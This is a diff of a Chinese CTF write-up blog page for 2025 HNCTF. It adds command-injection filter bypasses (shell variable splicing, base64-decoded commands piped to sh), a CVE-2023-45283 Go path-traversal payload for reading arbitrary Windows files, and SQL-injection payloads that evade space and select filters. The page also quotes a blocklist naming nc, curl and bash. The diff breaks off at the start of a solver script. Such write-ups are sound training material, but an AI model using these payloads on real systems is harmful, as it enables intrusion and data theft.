@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Really_Ez_Rce 考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); highlight_file(__FILE__); error_reporting(0); if (isset($_REQUEST[&#39;Number&#39;])) { $inputNumber = $_REQUEST[&#39;Number&#39;]; if (preg_match(&#39;/\\d/&#39;, $inputNumber)) { die(&#34;不行不行,不能这样&#34;);\t#包含任何数字，程序终止 } if (intval($inputNumber)) { echo &#34;OK,接下来你知道该怎么做吗&#34;; if (isset($_POST[&#39;cmd&#39;])) { $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match( &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\&#39;|\\&#34;|id/i&#39;, $cmd )) { echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; system($cmd); } else { echo &#34;nonono,hacker!!!&#34;; } } } } 1 2 3 4 5 Number[]=1&amp;cmd=l$1s / Number[]=1&amp;cmd=echo bHMgLw== | bas$1e64 -d | s$1h\t#ls / Number[]=1&amp;cmd=echo Y2F0ICAvZmxhZy50eHQ= | bas$1e64 -d | s$1h\t#cat /flag 这个就是数组绕过preg正则匹配，然后用特殊变量：$1到$9、$@和$*绕过waf，这些特殊变量输出为空，其实就是用它代替过滤掉的单引号和双引号,执行ls /后发现flag.txt，但是过滤了点号，*,?,所以就用base64过滤，\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Really_Ez_Rce 考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf或者拼接绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); highlight_file(__FILE__); error_reporting(0); if (isset($_REQUEST[&#39;Number&#39;])) { $inputNumber = $_REQUEST[&#39;Number&#39;]; if (preg_match(&#39;/\\d/&#39;, $inputNumber)) { die(&#34;不行不行,不能这样&#34;);\t#包含任何数字，程序终止 } if (intval($inputNumber)) { echo &#34;OK,接下来你知道该怎么做吗&#34;; if (isset($_POST[&#39;cmd&#39;])) { $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match( &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\&#39;|\\&#34;|id/i&#39;, $cmd )) { echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; system($cmd); } else { echo &#34;nonono,hacker!!!&#34;; } } } } 1 2 3 4 5 6 7 8 9 10 Number[]=1&amp;cmd=l$1s / Number[]=1&amp;cmd=echo bHMgLw== | bas$1e64 -d | s$1h\t#ls / Number[]=1&amp;cmd=echo Y2F0ICAvZmxhZy50eHQ= | bas$1e64 -d | s$1h\t#cat /flag 也可以拼接 cmd=a=l;b=s;$a$b / #执⾏ ls / cmd=a=b;b=ase64;c=s;d=h;echo Y2F0ICAvZmxhZy50eHQ= | $a$b -d | $c$d 这个就是数组绕过preg正则匹配，然后用特殊变量：$1到$9、$@和$*绕过waf，这些特殊变量输出为空，其实就是用它代替过滤掉的单引号和双引号,执行ls /后发现flag.txt，但是过滤了点号，*,?,所以就用base64过滤，\n">
 <title>2025-HNCTF</title>
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/2025-hnctf/'>
 
 <link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2025-HNCTF">
-<meta property='og:description' content="Really_Ez_Rce 考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); highlight_file(__FILE__); error_reporting(0); if (isset($_REQUEST[&#39;Number&#39;])) { $inputNumber = $_REQUEST[&#39;Number&#39;]; if (preg_match(&#39;/\\d/&#39;, $inputNumber)) { die(&#34;不行不行,不能这样&#34;);\t#包含任何数字，程序终止 } if (intval($inputNumber)) { echo &#34;OK,接下来你知道该怎么做吗&#34;; if (isset($_POST[&#39;cmd&#39;])) { $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match( &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\&#39;|\\&#34;|id/i&#39;, $cmd )) { echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; system($cmd); } else { echo &#34;nonono,hacker!!!&#34;; } } } } 1 2 3 4 5 Number[]=1&amp;cmd=l$1s / Number[]=1&amp;cmd=echo bHMgLw== | bas$1e64 -d | s$1h\t#ls / Number[]=1&amp;cmd=echo Y2F0ICAvZmxhZy50eHQ= | bas$1e64 -d | s$1h\t#cat /flag 这个就是数组绕过preg正则匹配，然后用特殊变量：$1到$9、$@和$*绕过waf，这些特殊变量输出为空，其实就是用它代替过滤掉的单引号和双引号,执行ls /后发现flag.txt，但是过滤了点号，*,?,所以就用base64过滤，\n">
+<meta property='og:description' content="Really_Ez_Rce 考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf或者拼接绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); highlight_file(__FILE__); error_reporting(0); if (isset($_REQUEST[&#39;Number&#39;])) { $inputNumber = $_REQUEST[&#39;Number&#39;]; if (preg_match(&#39;/\\d/&#39;, $inputNumber)) { die(&#34;不行不行,不能这样&#34;);\t#包含任何数字，程序终止 } if (intval($inputNumber)) { echo &#34;OK,接下来你知道该怎么做吗&#34;; if (isset($_POST[&#39;cmd&#39;])) { $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match( &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\&#39;|\\&#34;|id/i&#39;, $cmd )) { echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; system($cmd); } else { echo &#34;nonono,hacker!!!&#34;; } } } } 1 2 3 4 5 6 7 8 9 10 Number[]=1&amp;cmd=l$1s / Number[]=1&amp;cmd=echo bHMgLw== | bas$1e64 -d | s$1h\t#ls / Number[]=1&amp;cmd=echo Y2F0ICAvZmxhZy50eHQ= | bas$1e64 -d | s$1h\t#cat /flag 也可以拼接 cmd=a=l;b=s;$a$b / #执⾏ ls / cmd=a=b;b=ase64;c=s;d=h;echo Y2F0ICAvZmxhZy50eHQ= | $a$b -d | $c$d 这个就是数组绕过preg正则匹配，然后用特殊变量：$1到$9、$@和$*绕过waf，这些特殊变量输出为空，其实就是用它代替过滤掉的单引号和双引号,执行ls /后发现flag.txt，但是过滤了点号，*,?,所以就用base64过滤，\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-hnctf/'>
 <meta property='og:site_name' content='罗铠鸿'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-06-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-06-09T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-HNCTF">
-<meta name="twitter:description" content="Really_Ez_Rce 考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); highlight_file(__FILE__); error_reporting(0); if (isset($_REQUEST[&#39;Number&#39;])) { $inputNumber = $_REQUEST[&#39;Number&#39;]; if (preg_match(&#39;/\\d/&#39;, $inputNumber)) { die(&#34;不行不行,不能这样&#34;);\t#包含任何数字，程序终止 } if (intval($inputNumber)) { echo &#34;OK,接下来你知道该怎么做吗&#34;; if (isset($_POST[&#39;cmd&#39;])) { $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match( &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\&#39;|\\&#34;|id/i&#39;, $cmd )) { echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; system($cmd); } else { echo &#34;nonono,hacker!!!&#34;; } } } } 1 2 3 4 5 Number[]=1&amp;cmd=l$1s / Number[]=1&amp;cmd=echo bHMgLw== | bas$1e64 -d | s$1h\t#ls / Number[]=1&amp;cmd=echo Y2F0ICAvZmxhZy50eHQ= | bas$1e64 -d | s$1h\t#cat /flag 这个就是数组绕过preg正则匹配，然后用特殊变量：$1到$9、$@和$*绕过waf，这些特殊变量输出为空，其实就是用它代替过滤掉的单引号和双引号,执行ls /后发现flag.txt，但是过滤了点号，*,?,所以就用base64过滤，\n">
+<meta name="twitter:description" content="Really_Ez_Rce 考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf或者拼接绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); highlight_file(__FILE__); error_reporting(0); if (isset($_REQUEST[&#39;Number&#39;])) { $inputNumber = $_REQUEST[&#39;Number&#39;]; if (preg_match(&#39;/\\d/&#39;, $inputNumber)) { die(&#34;不行不行,不能这样&#34;);\t#包含任何数字，程序终止 } if (intval($inputNumber)) { echo &#34;OK,接下来你知道该怎么做吗&#34;; if (isset($_POST[&#39;cmd&#39;])) { $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match( &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\\\\\|more|cc|tac|less|head|\\.|\\{|\\}|uniq|copy|%|file|xxd|date|\\[|\\]|flag|bash|env|!|\\?|ls|\\&#39;|\\&#34;|id/i&#39;, $cmd )) { echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; system($cmd); } else { echo &#34;nonono,hacker!!!&#34;; } } } } 1 2 3 4 5 6 7 8 9 10 Number[]=1&amp;cmd=l$1s / Number[]=1&amp;cmd=echo bHMgLw== | bas$1e64 -d | s$1h\t#ls / Number[]=1&amp;cmd=echo Y2F0ICAvZmxhZy50eHQ= | bas$1e64 -d | s$1h\t#cat /flag 也可以拼接 cmd=a=l;b=s;$a$b / #执⾏ ls / cmd=a=b;b=ase64;c=s;d=h;echo Y2F0ICAvZmxhZy50eHQ= | $a$b -d | $c$d 这个就是数组绕过preg正则匹配，然后用特殊变量：$1到$9、$@和$*绕过waf，这些特殊变量输出为空，其实就是用它代替过滤掉的单引号和双引号,执行ls /后发现flag.txt，但是过滤了点号，*,?,所以就用base64过滤，\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -281,7 +281,7 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#考点特殊变量1到9和绕过关键词wafbase64编码绕过字符waf">考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf</a></li>
+    <li><a href="#考点特殊变量1到9和绕过关键词wafbase64编码绕过字符waf或者拼接绕过">考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf或者拼接绕过</a></li>
   </ol>
 
   <ol>
@@ -294,6 +294,15 @@
 
   <ol>
     <li><a href="#考点python原型污染链污染静态目录static得到完整源码unicode编码绕过waf污染链原型得keysession伪造与ssti">考点：python原型污染链污染静态目录static得到完整源码+unicode编码绕过waf+污染链原型得key+session伪造与ssti</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#cve-2023-45283-通过构造ab错误转换为b访问任意文件">CVE-2023-45283-通过构造<code>a\..\??\b错误转换为\??\b</code>访问任意文件</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#1mysql8过滤select布尔盲注">1.mysql8过滤select布尔盲注</a></li>
+    <li><a href="#2用户名前缀匹配绕过密码验证-or">2.用户名前缀匹配绕过密码验证-or+%</a></li>
   </ol>
 </nav>
         </div>
@@ -362,7 +371,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 10 分钟
+                    阅读时长: 14 分钟
                 </time>
             </div>
         
@@ -378,7 +387,7 @@
     
     
     <h1 id="really_ez_rce">Really_Ez_Rce
-</h1><h2 id="考点特殊变量1到9和绕过关键词wafbase64编码绕过字符waf">考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf
+</h1><h2 id="考点特殊变量1到9和绕过关键词wafbase64编码绕过字符waf或者拼接绕过">考点：特殊变量$1到$9、$@和$*绕过关键词waf+base64编码绕过字符waf或者拼接绕过
 </h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -447,11 +456,16 @@
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Number[]=1&amp;cmd=l$1s /
@@ -459,6 +473,11 @@
 </span></span><span class="line"><span class="cl">Number[]=1&amp;cmd=echo bHMgLw== | bas$1e64 -d | s$1h	#ls /
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Number[]=1&amp;cmd=echo Y2F0ICAvZmxhZy50eHQ= | bas$1e64 -d | s$1h		#cat  /flag
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">也可以拼接
+</span></span><span class="line"><span class="cl">cmd=a=l;b=s;$a$b / #执⾏ ls /
+</span></span><span class="line"><span class="cl">cmd=a=b;b=ase64;c=s;d=h;echo Y2F0ICAvZmxhZy50eHQ= | $a$b -d | $c$d
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个就是数组绕过preg正则匹配，然后用特殊变量：$1到$9、$@和$*绕过waf，这些特殊变量输出为空，其实就是用它代替过滤掉的单引号和双引号,执行ls /后发现flag.txt，但是过滤了点号，<code>*</code>,<code>?</code>,所以就用base64过滤，</p>
@@ -1687,8 +1706,374 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="watch">Watch
-</h1><h1 id="半成品login">半成品login
-</h1><p>弱密码admin/admin123登入</p>
+</h1><h2 id="cve-2023-45283-通过构造ab错误转换为b访问任意文件">CVE-2023-45283-通过构造<code>a\..\??\b错误转换为\??\b</code>访问任意文件
+</h2><p>先登入到真实题目环境，token在题目界面。</p>
+<img src="image-20250615201510515.png" alt="image-20250615201510515" style="zoom:50%;" />
+<img src="image-20250615201537934.png" alt="image-20250615201537934" style="zoom:50%;" />
+<p>看go代码，发现是windos操作系统，有路径拼接，就是输入的路径拼接为\SystemRoot\路径。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">handle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;moran/watch/utils&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;net/http&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;path/filepath&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">ReadFileHandle</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">userPath</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">Query</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;path&#34;</span><span class="p">)</span> <span class="c1">// 从URL查询参数中获取path参数，存在注入风险</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">path</span> <span class="o">:=</span> <span class="nx">filepath</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="s">`\SystemRoot\`</span><span class="p">,</span> <span class="nx">userPath</span><span class="p">)</span> <span class="c1">// `\SystemRoot\` // 这是Windows系统的特殊路径，指向C:\Windows</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">handle</span><span class="p">,</span> <span class="nx">isDirectory</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">OpenPath</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span> <span class="c1">// 尝试打开指定路径的文件或目录</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;Error: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">),</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span> <span class="c1">// 处理打开文件时的错误</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">HandleClose</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span> <span class="c1">// 确保在函数返回时关闭文件句柄</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">response</span> <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">isDirectory</span> <span class="p">{</span> <span class="c1">// 判断是否为目录</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">response</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">ListDirectory</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span> <span class="c1">// 如果是目录，列出目录内容</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">response</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">handle</span><span class="p">)</span> <span class="c1">// 如果是文件，读取文件内容</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;Error: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">),</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span> <span class="c1">// 处理读取过程中的错误</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">response</span><span class="p">))</span> <span class="c1">// 将读取的内容写入HTTP响应</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再看题目的提示：注意go版本与路径，直接问无问</p>
+<img src="image-20250615205345556.png" alt="image-20250615205345556" style="zoom:50%;" />
+<p>可以找到相关文章</p>
+<p><a class="link" href="https://pkg.go.dev/vuln/GO-2023-2185"  target="_blank" rel="noopener"
+    >GO-2023-2185 - Go Packages</a></p>
+<p><a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-45283"  target="_blank" rel="noopener"
+    >NVD - CVE-2023-45283</a></p>
+<p>这个漏洞意思就是\a..??\b会错误输出为??\b。<strong>在Windows上，以?？\是根本地设备路径，</strong>?？\ 文件，就是可用于访问系统上的任意位置的文件，所有我们就可以拿key，题目提示key在D盘，所有构造路径..??\D:\key.txt</p>
+<img src="image-20250615210101625.png" alt="image-20250615210101625" style="zoom:33%;" />
+<p>然后输出入key就可以拿flag</p>
+<h1 id="半成品login">半成品login
+</h1><h2 id="1mysql8过滤select布尔盲注">1.mysql8过滤select布尔盲注
+</h2><p>弱密码admin/admin123登入</p>
+<img src="image-20250615162041349.png" alt="image-20250615162041349" style="zoom:33%;" />
+<p>提示有sql注入，想想肯定是在登入框那里，然后根据提示不出意外flag就在<code>hacker*****</code>用户</p>
+<p>那就开干</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin123%2527#		#双重url编码发现登入成功（bp需要双重，登入框编码一次就行）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-hnctf/image-20250615163020426.png"
+	width="1484"
+	height="385"
+	srcset="/p/2025-hnctf/image-20250615163020426_hu_3fa56d1717f35bb2.png 480w, /p/2025-hnctf/image-20250615163020426_hu_b144b83a7c38bf5b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250615163020426"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="385"
+		data-flex-basis="925px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1%2527/**/||/**/1=1#	#继续注入，发现过滤了空格/**/代替，or过滤了||代替
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-hnctf/image-20250615163107454.png"
+	width="1438"
+	height="374"
+	srcset="/p/2025-hnctf/image-20250615163107454_hu_f0bbc40b9862b5a.png 480w, /p/2025-hnctf/image-20250615163107454_hu_9021e7e6b4eb9394.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250615163107454"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="384"
+		data-flex-basis="922px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1%2527/**/order/**/by/**/4#			#order by判断列数为4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-hnctf/image-20250615163447474.png"
+	width="1131"
+	height="375"
+	srcset="/p/2025-hnctf/image-20250615163447474_hu_f98fb409647ec46.png 480w, /p/2025-hnctf/image-20250615163447474_hu_2e10c11577331948.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250615163447474"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="723px"
+	
+></p>
+<p><img src="/p/2025-hnctf/image-20250615163459219.png"
+	width="1142"
+	height="380"
+	srcset="/p/2025-hnctf/image-20250615163459219_hu_57daa7c038d77b73.png 480w, /p/2025-hnctf/image-20250615163459219_hu_d7858413e981135b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250615163459219"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="300"
+		data-flex-basis="721px"
+	
+></p>
+<p>过滤了select，用table，这个和select差不多，可列出表的详细内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">与SELECT的区别：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1.TABLE始终显示表的所有列
+</span></span><span class="line"><span class="cl">2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">可以用来获取所有表名
+</span></span><span class="line"><span class="cl">table information_schema.schemata;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">补充:values可以构造一个表,values可以接在union后面，可以判断列数
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接上官方脚本，自己编不出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
